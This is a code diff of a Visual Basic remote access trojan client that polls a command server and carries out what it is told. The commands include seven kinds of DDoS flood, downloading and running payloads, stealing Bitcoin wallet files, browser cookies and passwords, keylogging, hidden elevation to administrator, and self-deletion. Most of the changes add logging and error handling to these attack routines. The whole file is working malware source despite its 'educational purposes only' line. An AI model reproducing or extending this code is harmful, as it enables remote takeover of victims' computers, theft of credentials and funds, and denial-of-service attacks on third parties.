@@ -25,7 +25,7 @@ Imports svchost.Spreads
 ' RemoteDesktop By: Black.Hacker
 ' 
 ' Thx to : Nyan Cat, KFC, Underc0de
-' Copyright (c) DarkSoftwareCo & Black.Hackr
+' Copyright (c) Black.Hackr - 2020
 '
 ' This Project is for educational purposes only.
 ' 
@@ -65,6 +65,13 @@ Public Class Form1
     Public C As HTTP = New HTTP
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
+
+            If checkBlacklist() = True Then
+                C.Send("Uninstall")
+                DStartup(StartName)
+                Application.Exit()
+            End If
+
             If ElevateUAC = "True" Then
                 Try
                     Dim ElevateThread As New Thread(AddressOf RestartElevated)
@@ -101,12 +108,6 @@ Public Class Form1
             C.ID = ID & "_" & HWD()
             C.Connect()
             C.Send("Online")
-
-            If checkBlacklist() = True Then
-                C.Send("Uninstall")
-                DStartup(StartName)
-                Application.Exit()
-            End If
 
             If BinderStatus = "True" Then
                 Dim Binder As New BinderService
@@ -218,76 +219,152 @@ Public Class Form1
                 Dim GetCommands As New WebClient
                 Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                 If RSAStatus = "True" Then : CurrentHost = RSA_Decrypt(Host, RSAKey) : Else : CurrentHost = Host : End If
-                Dim Command As String = GetCommands.DownloadString(CurrentHost & "/getCommand.php?id=" & ID & "_" & HWD())
+                Dim Command As String = GetCommands.DownloadString(CurrentHost & "/getCommand.php?id=" & C.ENB(ID & "_" & HWD()))
                 Dim A As String() = Split(C.DEB(Command), Y)
                 Select Case A(0)
                     Case "Ping"
-                        C.Send("Online")
+                        C.Send("Ping")
 
                     Case "StartDDOS"
                         Select Case A(1)
                             Case "UDPAttack"
-                                UDP.Host = A(2)
-                                UDP.Threadsto = 3
-                                UDP.Time = 300
-                                UDP.DOSData = Randomisi(300)
-                                UDP.Start()
-                                C.Send("CleanCommands")
+                                Try
+                                    UDP.Host = A(2)
+                                    UDP.Threadsto = A(3)
+                                    UDP.Time = A(4)
+                                    UDP.DOSData = Randomisi(300)
+                                    UDP.Start()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "UDP Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " + ex.Message)
+                                End Try
 
                             Case "SlowlorisAttack"
-                                Slowloris.StartSlowloris(A(2), 3, 300, Randomisi(300))
-                                C.Send("CleanCommands")
+                                Try
+                                    Slowloris.StartSlowloris(A(2), A(3), A(4), Randomisi(300))
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "Slowloris Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "ARMEAttack"
-                                ARME.StartARME(A(2), 3, 300, Randomisi(300))
-                                C.Send("CleanCommands")
+                                Try
+                                    ARME.StartARME(A(2), A(3), A(4), Randomisi(300))
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "ARME Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "TCPAttack"
-                                Condis.StartCondis(A(2), 3, 300, 80)
-                                C.Send("CleanCommands")
+                                Try
+                                    Condis.StartCondis(A(2), A(3), A(4), 80)
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "TCP Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "HTTPGetAttack"
-                                HTTPGet.StartHTTPGet(A(2), 3, 300)
-                                C.Send("CleanCommands")
+                                Try
+                                    HTTPGet.StartHTTPGet(A(2), A(3), A(4))
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "HTTP (GET) Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "BWFloodAttack"
-                                BandwidthFlood.StartBandwidthFlood(A(2), 3, 300)
-                                C.Send("CleanCommands")
+                                Try
+                                    BandwidthFlood.StartBandwidthFlood(A(2), A(3), A(4))
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "Bandwidth Flood Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "PostHTTPAttack"
-                                PostHTTP.StartPOSTHTTP(A(2), 3, 300, Randomisi(300))
-                                C.Send("CleanCommands")
+                                Try
+                                    PostHTTP.StartPOSTHTTP(A(2), A(3), A(4), Randomisi(300))
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "HTTP (POST) Attack Started")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
                         End Select
 
                     Case "StopDOOS"
                         Select Case A(1)
                             Case "UDPAttack"
-                                UDP.Abort()
-                                C.Send("CleanCommands")
+                                Try
+                                    UDP.Abort()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "UDP Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
 
                             Case "SlowlorisAttack"
-                                Slowloris.StopSlowloris()
-                                C.Send("CleanCommands")
+                                Try
+                                    Slowloris.StopSlowloris()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "Slowloris Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
 
                             Case "ARMEAttack"
-                                ARME.StopARME()
-                                C.Send("CleanCommands")
+                                Try
+                                    ARME.StopARME()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "ARME Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
 
                             Case "TCPAttack"
-                                Condis.StopCondis()
-                                C.Send("CleanCommands")
+                                Try
+                                    Condis.StopCondis()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "TCP Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
 
                             Case "HTTPGetAttack"
-                                HTTPGet.StopHTTPGET()
-                                C.Send("CleanCommands")
+                                Try
+                                    HTTPGet.StopHTTPGET()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "HTTP (GET) Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
 
                             Case "BWFloodAttack"
-                                BandwidthFlood.StopBandwidthFlood()
-                                C.Send("CleanCommands")
+                                Try
+                                    BandwidthFlood.StopBandwidthFlood()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "Bandwidth Flood Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
 
                             Case "PostHTTPAttack"
-                                PostHTTP.StopPOSTHTTP()
-                                C.Send("CleanCommands")
+                                Try
+                                    PostHTTP.StopPOSTHTTP()
+                                    C.Send("CleanCommands")
+                                    C.Log("Succ", "HTTP (POST) Attack Stopped")
+                                Catch ex As Exception
+                                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                                End Try
+
                         End Select
 
                     Case "UploadFile"
@@ -297,8 +374,9 @@ Public Class Form1
                             IO.File.WriteAllBytes(Environ("Temp") & "\" & A(2), File)
                             Process.Start(Environ("Temp") & "\" & A(2))
                             C.Send("CleanCommands")
+                            C.Log("Succ", "File has been uploaded and executed")
                         Catch ex As Exception
-
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
 
                     Case "OpenPage"
@@ -316,6 +394,7 @@ Public Class Form1
                     Case "Uninstall"
                         Try
                             C.Send("Uninstall")
+                            C.Log("Succ", "Client has been removed")
                             If Startup = "True" Then
                                 DStartup(StartName)
                             End If
@@ -325,7 +404,7 @@ Public Class Form1
                             SelfDestroy()
                             Application.Exit()
                         Catch ex As Exception
-
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
 
                     Case "ExecuteScript"
@@ -342,68 +421,92 @@ Public Class Form1
                             End Select
                             C.Send("DeleteScript" & "|BN|" & A(2))
                             C.Send("CleanCommands")
+                            C.Log("Succ", "Script Has heen executed")
                         Catch ex As Exception
                             C.Send("CleanCommands")
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
 
 
                     Case "Close"
-                        C.Send("CleanCommands")
-                        C.Send("Offline")
-                        If WatcherStatus = "True" Then
-                            Watchdog.StopWatcher(False)
-                        End If
-                        Application.Exit()
+                        Try
+                            C.Send("CleanCommands")
+                            C.Log("Succ", "Connection closed")
+                            C.Send("Offline")
+                            If WatcherStatus = "True" Then
+                                Watchdog.StopWatcher(False)
+                            End If
+                            Application.Exit()
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
+
 
                     Case "ShowMessageBox"
-                        Dim msgIcon As MessageBoxIcon
-                        Dim msgButton As MessageBoxButtons
+                        Try
+                            Dim msgIcon As MessageBoxIcon
+                            Dim msgButton As MessageBoxButtons
 
-                        Select Case A(3)
-                            Case "None"
-                                msgIcon = MessageBoxIcon.None
-                            Case "Information"
-                                msgIcon = MessageBoxIcon.Information
-                            Case "Asterisk"
-                                msgIcon = MessageBoxIcon.Asterisk
-                            Case "Critical"
-                                msgIcon = MessageBoxIcon.Error
-                            Case "Warning"
-                                msgIcon = MessageBoxIcon.Warning
-                            Case "Question"
-                                msgIcon = MessageBoxIcon.Question
-                        End Select
+                            Select Case A(3)
+                                Case "None"
+                                    msgIcon = MessageBoxIcon.None
+                                Case "Information"
+                                    msgIcon = MessageBoxIcon.Information
+                                Case "Asterisk"
+                                    msgIcon = MessageBoxIcon.Asterisk
+                                Case "Critical"
+                                    msgIcon = MessageBoxIcon.Error
+                                Case "Warning"
+                                    msgIcon = MessageBoxIcon.Warning
+                                Case "Question"
+                                    msgIcon = MessageBoxIcon.Question
+                            End Select
 
-                        Select Case A(4)
-                            Case "OkOnly"
-                                msgButton = MessageBoxButtons.OK
-                            Case "OkCancel"
-                                msgButton = MessageBoxButtons.OKCancel
-                            Case "YesNo"
-                                msgButton = MessageBoxButtons.YesNo
-                            Case "YesNoCancel"
-                                msgButton = MessageBoxButtons.YesNoCancel
-                            Case "AbortRetryIgnore"
-                                msgButton = MessageBoxButtons.AbortRetryIgnore
-                            Case "RetryCancel"
-                                msgButton = MessageBoxButtons.RetryCancel
-                        End Select
+                            Select Case A(4)
+                                Case "OkOnly"
+                                    msgButton = MessageBoxButtons.OK
+                                Case "OkCancel"
+                                    msgButton = MessageBoxButtons.OKCancel
+                                Case "YesNo"
+                                    msgButton = MessageBoxButtons.YesNo
+                                Case "YesNoCancel"
+                                    msgButton = MessageBoxButtons.YesNoCancel
+                                Case "AbortRetryIgnore"
+                                    msgButton = MessageBoxButtons.AbortRetryIgnore
+                                Case "RetryCancel"
+                                    msgButton = MessageBoxButtons.RetryCancel
+                            End Select
 
-                        MessageBox.Show(A(1), A(2), msgButton, msgIcon)
-                        C.Send("CleanCommands")
+                            MessageBox.Show(A(1), A(2), msgButton, msgIcon)
+                            C.Send("CleanCommands")
+                            C.Log("Succ", "Messagebox has poped up")
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
 
                     Case "MoveClient"
-                        My.Settings.moveStatus = True
-                        My.Settings.newHost = A(1)
-                        My.Settings.Save()
-                        C.Send("Uninstall")
-                        Application.Restart()
+                        Try
+                            My.Settings.moveStatus = True
+                            My.Settings.newHost = A(1)
+                            My.Settings.Save()
+                            C.Log("Succ", "Client has been moved to the new host")
+                            C.Send("Uninstall")
+                            Application.Restart()
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
+
 
                     Case "Blacklist"
-                        My.Settings.blacklist = True
-                        My.Settings.Save()
-                        C.Send("Uninstall")
-                        Application.Exit()
+                        Try
+                            My.Settings.blacklist = True
+                            My.Settings.Save()
+                            C.Send("Uninstall")
+                            C.Log("Succ", "Client has been blacklisted")
+                            Application.Exit()
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
 
                     Case "Screenshot"
                         Dim Screenshot As New RemoteDesktop
@@ -427,13 +530,19 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "StealBitcoin"
-                        If (File.Exists(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))) Then
-                            C.Upload(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))
-                            C.Send("CleanCommands")
-                        Else
-                            C.Send("CleanCommands")
-                            Return
-                        End If
+                        Try
+                            If (File.Exists(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))) Then
+                                C.Upload(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))
+                                C.Send("CleanCommands")
+                                C.Log("Succ", "Bitcoin Wallet has been uploaded")
+                            Else
+                                C.Send("CleanCommands")
+                                Return
+                            End If
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
+
 
                     Case "StartKeylogger"
                         tt.IsBackground = True
@@ -477,16 +586,32 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "Logoff"
-                        C.Send("CleanCommands")
-                        Shell("shutdown -l -t 00", AppWinStyle.Hide)
+
+                        Try
+                            C.Send("CleanCommands")
+                            Shell("shutdown -l -t 00", AppWinStyle.Hide)
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+                        End Try
+
 
                     Case "Restart"
-                        C.Send("CleanCommands")
-                        Shell("shutdown -r -t 00", AppWinStyle.Hide)
+                        Try
+                            C.Send("CleanCommands")
+                            Shell("shutdown -r -t 00", AppWinStyle.Hide)
+                        Catch ex As Exception
+
+                        End Try
 
                     Case "Shutdown"
-                        C.Send("CleanCommands")
-                        Shell("shutdown -s -t 00", AppWinStyle.Hide)
+                        Try
+
+                            C.Send("CleanCommands")
+                            Shell("shutdown -s -t 00", AppWinStyle.Hide)
+
+                        Catch ex As Exception
+
+                        End Try
                 End Select
             Loop
         Catch ex As Exception
@@ -500,8 +625,10 @@ Public Class Form1
                 File.Copy(chromeData & "Cookies", TempPath & "\" & "CookiesCh.sqlite")
                 C.Upload(TempPath & "\" & "CookiesCh.sqlite")
             End If
+            C.Log("Succ", "Chrome cookies has been uploaded")
             Return True
         Catch ex As Exception
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
             Return False
         End Try
     End Function
@@ -518,8 +645,10 @@ Public Class Form1
                 End If
                 i = i + 1
             End While
+            C.Log("Succ", "Firefox cookies has been uploaded")
             Return True
         Catch ex As Exception
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
             Return False
         End Try
     End Function
@@ -535,6 +664,7 @@ Public Class Form1
             Process.Start(si)
             Return True
         Catch ex As System.ComponentModel.Win32Exception
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
             Return False
         End Try
     End Function
@@ -553,14 +683,18 @@ Public Class Form1
         Return res
     End Function
     Public Sub SelfDestroy()
-        Dim si As ProcessStartInfo = New ProcessStartInfo()
-        With si
-            .FileName = "cmd.exe"
-            .Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & GetLocation() & """"
-            .CreateNoWindow = True
-            .WindowStyle = ProcessWindowStyle.Hidden
-        End With
-        Process.Start(si)
+        Try
+            Dim si As ProcessStartInfo = New ProcessStartInfo()
+            With si
+                .FileName = "cmd.exe"
+                .Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & GetLocation() & """"
+                .CreateNoWindow = True
+                .WindowStyle = ProcessWindowStyle.Hidden
+            End With
+            Process.Start(si)
+        Catch ex As Exception
+
+        End Try
     End Sub
     Public Function UpdateClient(ByVal URL As String)
         Try
@@ -568,13 +702,15 @@ Public Class Form1
             Download.DownloadFile(URL, TempPath & "\updatedpayload.exe")
             File.SetAttributes(TempPath & "\updatedpayload.exe", FileAttributes.Hidden + FileAttributes.System)
             C.Send("Uninstall")
+            C.Log("Succ", "Client has been updated")
             AStartup(getMD5Hash(File.ReadAllBytes(TempPath & "\updatedpayload.exe")), TempPath & "\updatedpayload.exe")
             Process.Start(TempPath & "\updatedpayload.exe")
             SelfDestroy()
             Application.Exit()
             Return True
         Catch ex As Exception
-            Return ex.Message
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+            Return False
         End Try
     End Function
     Public Function getMD5Hash(ByVal B As Byte()) As String
@@ -587,10 +723,15 @@ Public Class Form1
         Return str2
     End Function
     Public Sub OpenWebHidden(Url As String)
-        Dim openpage As New WebBrowser
-        openpage.ScriptErrorsSuppressed = True
-        openpage.Navigate(Url)
-        Application.Run()
+        Try
+            Dim openpage As New WebBrowser
+            openpage.ScriptErrorsSuppressed = True
+            openpage.Navigate(Url)
+            Application.Run()
+            C.Log("Succ", "Webpage has been opened in hidden mode")
+        Catch ex As Exception
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
+        End Try
     End Sub
     Public Function checkadmin() As String
         Dim W_Id = WindowsIdentity.GetCurrent()
@@ -614,8 +755,10 @@ Public Class Form1
             Else
 
             End If
+            C.Log("Succ", "Password Stealer has been executed")
             Return True
         Catch ex As Exception
+            C.Log("Fail", "An unexpected error occurred " & ex.Message)
             Return ex.Message
         End Try
     End Function
@@ -638,19 +781,22 @@ Public Class Form1
     End Function
     Private Sub RestartElevated()
         If checkadmin() = "Administrator" Then
+
         Else
-            Dim startInfo As New ProcessStartInfo()
-            With startInfo
-                .UseShellExecute = True
-                .WorkingDirectory = Environment.CurrentDirectory
-                .FileName = Application.ExecutablePath
-                .Verb = "runas"
-            End With
             Try
+                Dim startInfo As New ProcessStartInfo()
+                With startInfo
+                    .UseShellExecute = True
+                    .WorkingDirectory = Environment.CurrentDirectory
+                    .FileName = Application.ExecutablePath
+                    .Verb = "runas"
+                End With
                 C.Send("CleanCommands")
+                C.Log("Succ", "Client has been elevated to admin")
                 Dim p As Process = Process.Start(startInfo)
                 End
             Catch ex As System.ComponentModel.Win32Exception
+                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                 C.Send("CleanCommands")
                 Return
             End Try
